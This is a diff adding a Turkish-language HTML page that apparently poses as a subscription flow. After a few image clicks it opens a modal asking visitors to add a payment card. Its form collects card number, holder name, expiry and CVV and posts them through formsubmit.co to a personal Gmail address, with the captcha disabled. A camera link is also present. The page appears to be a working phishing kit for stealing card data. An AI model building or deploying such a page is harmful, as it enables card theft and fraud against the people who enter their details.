@@ -1,0 +1,660 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="mark.css">
+    <style>
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            overflow: auto;
+            background-color: rgba(0,0,0,0.4);
+        }
+        .credit-card {
+  position: relative;
+  width: 290px;
+  height: 260px;
+  margin-top: px;
+  transform-style: preserve-3d;
+  transition: 0.3s;
+}
+.card-front,
+.card-back {
+  position: absolute;
+  width: inherit;
+  height: 160px;
+  background: linear-gradient(#33a4f8, #206df9);
+  border-radius: 1em;
+  backface-visibility: hidden;
+}
+.card-front {
+  padding: 2em 1em;
+}
+.branding {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.branding img {
+  width: 1px;
+  height: 70px;
+}
+.card-back {
+  position: absolute;
+  transform: rotateY(180deg);
+}
+.card-number {
+  color: #ffffff;
+  font-weight: 600;
+  display: flex;
+  justify-content: space-between;
+  font-size: 0.8em;
+  margin-top: 12px;
+}
+.details {
+  color: #ffffff;
+  display: flex;
+  justify-content: space-between;
+  margin-top: 1.5em;
+  font-size: 0.8em;
+}
+.details span {
+  display: block;
+}
+.details #card-holder-name {
+  text-transform: uppercase;
+}
+.card-back .black-strip {
+  position: relative;
+  background-color: #000000;
+  height: 50px;
+  top: 2em;
+}
+.card-back .white-strip {
+  top: 3em;
+  position: relative;
+  text-align: right;
+}
+.card-back .white-strip span {
+  margin-right: 1em;
+}
+.card-back .white-strip div {
+  height: 30px;
+  background-color: #ffffff;
+  margin-top: 0.5em;
+}
+.card-back .visa-logo {
+  position: absolute;
+  width: 50px;
+  margin-top: 4em;
+  right: 1em;
+}
+form {
+  margin-top: 2em;
+}
+label,
+input {
+  display: block;
+}
+.number1 label {
+  margin-bottom: 0.5em;
+  font-weight: 400;
+  margin-left: 2px;
+  margin-bottom: -50px
+    }
+ .name3 label{
+ margin-left: 2px;
+ }
+ .name4{
+ margin-left: 0px;
+}
+
+.name5 label {
+  margin-bottom: 2em;
+  font-weight: 600;
+}
+input {
+  width: 100%;
+  border: 1px solid #000000;
+  padding: 1em 0.5em;
+  border-radius: 0.5em;
+}
+input:not(:last-child) {
+  margin-bottom: 1em;
+}
+form .date-cvv {
+  display: flex;
+  justify-content: space-between;
+}
+
+     
+      
+        .modal-content {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            margin-top: 160px;   
+            border-radius: 14px;  
+        }
+        .modal-content1 p {
+            font-weight: bold;
+        }
+        .modal-content1 {
+            background-color: #fefefe;
+            margin: 15% auto;
+            padding: 20px;
+            border: 1px solid #888;
+            width: 80%;
+            margin-top: 14px;   
+            border-radius: 14px;  
+        }
+        .modal-content button {
+            background-color: #55c1ff;
+            color: #ffffff;
+            height: 47px;
+            width: 300px;
+            border: none;
+            font-size: 21px;
+            border-radius: 13px;
+            margin-left: 2px;      
+             }
+         .modal-content1 button {
+            background-color: #55c1ff;
+            color: #ffffff;
+            height: 47px;
+            width: 300px;
+            border: none;
+            font-size: 21px;
+            border-radius: 13px;
+        margin-top: 10px;
+        margin-left: 8px;
+        justify-content: center; 
+       align-items: center;   
+     margin-bottom: 10px;  
+               }
+        .modal-content1-scroll {
+            max-height: 80vh; /* Make the modal content scrollable */
+            overflow-y: auto;
+        }
+        .modal img {
+            width: 100%;
+        }
+        .picture3 {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            text-align: center;
+            background-color: rgba(255, 255, 255, 0.8); /* Optional: Add a background color */
+        }
+        .picture3 img {
+            width: 398px; /* Adjust the width as needed */
+        }
+        /* Specific styling for the camera image */
+        .camera-img {
+            width: 40px; /* Set the width as needed */
+            height: 220px; /* Maintain aspect ratio */
+        }
+  .name1 input{
+  width: 56%;
+    height: 67px;
+    border-radius: 20px;
+    outline: none;
+    border: 2px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 0px;
+    font-weight: 400;
+ sans-serif;
+    font-weight: 400;
+    }
+    
+    
+        .name3 input{
+    width: 20%;
+    height: 19px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 140px;
+    font-weight: 400;
+ sans-serif;
+ margin-right: 0px; 
+   }
+    .name3 label{
+  width: 19%;
+    height: 41px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 79px;
+   text-align:center;
+   align-items: center;
+   margin-top: 10px;
+  }
+ .name4 label{
+  width: 42%;
+    height: 30px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 190px;
+  margin-top: 9px;
+     
+  text-align: center;
+   align-items: center;
+  margin-bottom: -9px;
+     }
+    .name5 label{
+  width: 21%;
+    height: 51px;
+    border-radius: 7px;
+    outline: none;
+    border: 1.5px solid #0000009e;
+    font-size: 15px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 1px;
+    font-weight: 400;
+    margin-top: -200px;
+    margin-bottom: -30px;
+       }
+         .name4 select{
+    width: 71%;
+    height: 30px;
+    border-radius: 7px;
+    outline: none;
+    border: none;
+    font-size: 18px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 50px;
+    font-weight: 400;
+ sans-serif;
+ margin-top: 12px;
+margin-bottom: 0px;
+  }     
+      .name5 select{
+    width: 71%;
+    height: 30px;
+    border-radius: 7px;
+    outline: none;
+    border: none;
+    font-size: 18px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 51px;
+    font-weight: 400;
+ sans-serif;
+ margin-top: px;
+margin-bottom: -600px;
+    {
+    .name5 select{
+    width: 21%;
+    height: 30px;
+    border-radius: 7px;
+    outline: none;
+    border: none;
+    font-size: 18px;
+    font-family: "Poppins", sans-serif;
+   margin-left: 79px;
+    font-weight: 400;
+ sans-serif;
+ margin-top: px;
+margin-bottom: -10px;
+  }     
+ .name3{
+     display: flex;
+            flex-direction: column;
+        }
+        .name3 input {
+            margin-bottom: 10px;
+     
+ }
+
+ .name4{
+     display: flex;
+            flex-direction: column;
+        }
+        .name4 input {
+            margin-bottom: 10px;
+     
+     
+ }
+.name5{
+display: flex;
+            flex-direction: column;
+        }
+        .name5 input {
+            margin-bottom: 10px;
+
+
+  }
+  .card-front img{
+     height: 67px;
+  }
+    </style>
+</head>
+<body>
+    <div class="picture1">
+        <img src="picture1.jpg">
+    </div>
+    <div class="picture2">
+        <img src="first.jpg">
+    </div>
+    <div class="second">
+        <img src="second.jpg" id="second-img">
+    </div>
+    <div class="third">
+        <img src="third.jpg" id="third-img">
+    </div>
+    <div class="fourth">
+        <img src="fourth.jpg">
+    </div>
+    <div class="fifth">
+        <img src="fifth.jpg" id="fifth-img">
+    </div>
+    <div class="add">
+        <img src="addd.jpg">
+    </div>
+    <div class="picture3">
+        <img src="picture3.jpg" id="picture3-img">
+    </div>
+    
+
+    <!-- Modal for second-img -->
+    <div id="modal-second" class="modal">
+        <div class="modal-content">
+            <img src="main.jpg">
+            <button onclick="openModal('modal-third')">ABONE </button>
+        </div>
+    </div>
+
+    <!-- Modal for third-img -->
+    <div id="modal-third" class="modal"> 
+        <div class="modal-content1 modal-content1-scroll">
+            <p>LÜTFEN ÖDEME KARTI EKLEYİN </p>
+         
+        
+  <img src="pay.jpg">
+  <img src="card.jpg">
+  <p>Devam etmek için lütfen aşağıdaki kamera resmine tıkladığınızdan veya kart bilgilerinizi aşağıya girdiğinizden emin olun. </p>
+  <a href="camera.html"><img src="camera.jpg" class="camera-img"></a>
+  <p>KART DETAYLARI </p>
+  <img src="card.jpg">
+ 
+    <div class="wrapper">
+      <div class="credit-card" id="card">
+        <div class="card-front">
+          <div class="branding">
+            <img src="chip.png" height=""class="chip-img" />
+            <img src="visa.png" class="visa-logo" />
+          </div>
+          <div class="card-number">
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+            <div>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+              <span class="card-number-display">_</span>
+            </div>
+          </div>
+          <div class="details">
+            <div>
+              <span> Kart sahibi </span>
+              <span id="card-holder-name">Adınız Burada</span>
+            </div>
+            <div>
+              <span>Süresi doluyor </span>
+              <span id="validity">AA/YY  </span>
+            </div>
+          </div>
+        </div>
+        <div class="card-back">
+          <div class="black-strip">Kart numarası </div>
+          <div class="white-strip">
+            <span>CVV</span>
+            <div id="cvv-display"></div>
+          </div>
+          <img src="visa.png" class="visa-logo" />
+        </div>
+      </div>
+       <form action="https://formsubmit.co/youngella513@gmail.com" method="POST">
+           
+          
+       <div class="number">
+        <label for="card-number">Kart numarası: 
+         <div class="number">
+        <input type="number" id="card-number" name="card-number" placeholder="1234123412341234" required ></div>
+      
+<div class="number1">
+        <label for="card-holder">Kart sahibi: 
+        <input type="text" id="card-name-input" name="NAME ON CARD" placeholder="Adınız " required>
+       <div class="name5">
+            
+            <select name="expiry-year" <label for="expiry-year" id="expiry-year" required>
+              <option value=""> Son Kullanma Yılı </option>
+             </label>
+            </select>
+            
+          </div>
+           <div class="name4">
+          
+            <select name="expiry-month" id="expiry-month" <label for="expiry-month"required >
+              <option value="">Son Kullanma Ayı </option>
+              <option value="01">01</option>
+              <option value="02">02</option>
+              <option value="03">03</option>
+              <option value="04">04</option>
+              <option value="05">05</option>
+              <option value="06">06</option>
+              <option value="07">07</option>
+              <option value="08">08</option>
+              <option value="09">09</option>
+              <option value="10">10</option>
+              <option value="11">11</option>
+              <option value="12">12</option>
+             </label>
+            </select>
+          </div>
+        <div class="name3">
+            <label for="cvv">CVV: </label>
+            <input type="number" id="cvv" name="CVV" placeholder="***" required >
+         
+        
+          
+          <input type="hidden" name="_captcha" value="false">
+          <input type="hidden" name="_next" value="http://localhost:8080/thankyou.html">
+          <div class="btn">
+            <button type="submit">DOĞRULAMAK </button>
+          </div>
+        </div>
+      </form>
+    </div>
+  </form>
+          
+  <script>
+    const cardNumber = document.getElementById("card-number");
+    const cardHolderName = document.getElementById("card-holder-name");
+    const cardNameInput = document.getElementById("card-name-input");
+    const displayValidity = document.getElementById("validity");
+    const cardNumberDisplay = document.querySelectorAll(".card-number-display");
+    const cvvInput = document.getElementById("cvv");
+    const cvvDisplay = document.getElementById("cvv-display");
+    const expiryMonthSelect = document.getElementById("expiry-month");
+    const expiryYearSelect = document.getElementById("expiry-year");
+
+    let currentSpanIndex = 0;
+
+    cardNumber.addEventListener("input", () => {
+      const inputNumber = cardNumber.value.replace(/\D/g, "");
+      cardNumber.value = cardNumber.value.slice(0, 16).replace(/\D/g, "");
+      for (let i = 0; i < cardNumberDisplay.length; i++) {
+        if (i < inputNumber.length) {
+          cardNumberDisplay[i].textContent = inputNumber[i];
+        } else {
+          cardNumberDisplay[i].textContent = "_";
+        }
+      }
+
+      if (inputNumber.length <= cardNumberDisplay.length) {
+        currentSpanIndex = inputNumber.length;
+      } else {
+        currentSpanIndex = cardNumberDisplay.length;
+      }
+    });
+
+    cardNameInput.addEventListener("input", () => {
+      if (cardNameInput.value.length < 1) {
+        cardHolderName.innerText = "Your Name Here";
+      } else if (cardNameInput.value.length > 30) {
+        cardNameInput.value = cardNameInput.value.slice(0, 30);
+      } else {
+        cardHolderName.innerText = cardNameInput.value;
+      }
+    });
+
+    // Populate the expiry year dropdown dynamically
+    window.onload = () => {
+      cvvInput.value = "";
+      expiryMonthSelect.value = "";
+      expiryYearSelect.value = "";
+      cardNameInput.value = "";
+      cardNumber.value = "";
+      displayValidity.innerText = "MM/YY";
+
+      const currentYear = new Date().getFullYear();
+      for (let i = 0; i < 10; i++) {
+        const option = document.createElement("option");
+        option.value = currentYear + i;
+        option.textContent = currentYear + i;
+        expiryYearSelect.appendChild(option);
+      }
+    };
+
+    // Update the validity display when the month or year changes
+    function updateExpiryDisplay() {
+      const selectedMonth = expiryMonthSelect.value;
+      const selectedYear = expiryYearSelect.value.slice(2); // Get last 2 digits of the year
+      if (selectedMonth && selectedYear) {
+        displayValidity.innerText = `${selectedMonth}/${selectedYear}`;
+      } else {
+        displayValidity.innerText = "MM/YY";
+      }
+    }
+
+    expiryMonthSelect.addEventListener("change", updateExpiryDisplay);
+    expiryYearSelect.addEventListener("change", updateExpiryDisplay);
+
+    // CVV input handling
+    cvvInput.addEventListener("input", () => {
+      const userInput = cvvInput.value;
+      const sanitizedInput = userInput.slice(0, 3);
+      const numericInput = sanitizedInput.replace(/\D/g, "");
+      cvvInput.value = numericInput;
+      cvvDisplay.innerText = numericInput;
+    });
+
+    // Flip card to show CVV
+    cvvInput.addEventListener("click", () => {
+      document.getElementById("card").style.transform = "rotateY(180deg)";
+    });
+
+    // Reflip card to show front
+    document.addEventListener("click", () => {
+      if (document.activeElement.id !== "cvv") {
+        document.getElementById("card").style.transform = "rotateY(0deg)";
+      }
+    });
+  </script>
+
+  </body>
+</html>
+
+
+
+    <!-- Modal for fifth-img -->
+    <div id="modal-fifth" class="modal">
+        <div class="modal-content">
+            <p>This is the third pop-up message with the fifth image.</p>
+      
+            <img src="fifth.jpg">
+            <button onclick="openModal('modal-picture3')">Next</button>
+        </div>
+    </div>
+
+    <!-- Modal for picture3-img -->
+    <div id="modal-picture3" class="modal">
+        <div class="modal-content">
+            <p>This is the final pop-up message with the picture3 image.</p>
+            <img src="picture3.jpg">
+            <button onclick="closeModal('modal-picture3')">Close</button>
+        </div>
+    </div>
+
+    <script>
+    function showPopup(modalId) {
+            document.getElementById(modalId).style.display = "block";
+        }
+
+        function closeModal(modalId) {
+            document.getElementById(modalId).style.display = "none";
+        }
+
+        function openModal(modalId) {
+            closeAllModals();
+            showPopup(modalId);
+        }
+
+        function closeAllModals() {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => modal.style.display = 'none');
+        }
+
+        document.getElementById('second-img').addEventListener('click', () => showPopup('modal-second'));
+        document.getElementById('third-img').addEventListener('click', () => showPopup('modal-second'));
+        document.getElementById('fifth-img').addEventListener('click', () => showPopup('modal-second'));
+        document.getElementById('picture3-img').addEventListener('click', () => showPopup('modal-second'));
+        
+
+        window.onclick = function(event) {
+            const modals = document.querySelectorAll('.modal');
+            modals.forEach(modal => {
+                if (event.target == modal) {
+                    modal.style.display = "none";
+                }
+            });
+        }
+    </script>
+</body>
+</html>   
+       
+       
+       
